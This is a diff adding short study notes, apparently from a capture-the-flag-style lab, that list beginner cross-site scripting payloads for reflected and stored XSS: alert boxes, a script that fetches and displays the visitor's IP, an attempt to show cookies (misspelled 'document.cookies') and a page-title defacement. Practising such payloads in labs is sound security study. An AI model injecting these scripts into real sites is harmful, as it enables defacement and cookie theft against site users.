@@ -1,0 +1,9 @@
+Reflective XSS
+1) <script>alert("hello")</script>
+2) <script> fetch("https://api.ipify.org?format=json').then(r => r.json()) .then(d => alert("IP: " + d.ip)); </script>
+
+Stored XSS
+
+1) <h1>This is a Heading</h1>
+2) <script>alert(document.cookies)</script>
+3) <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
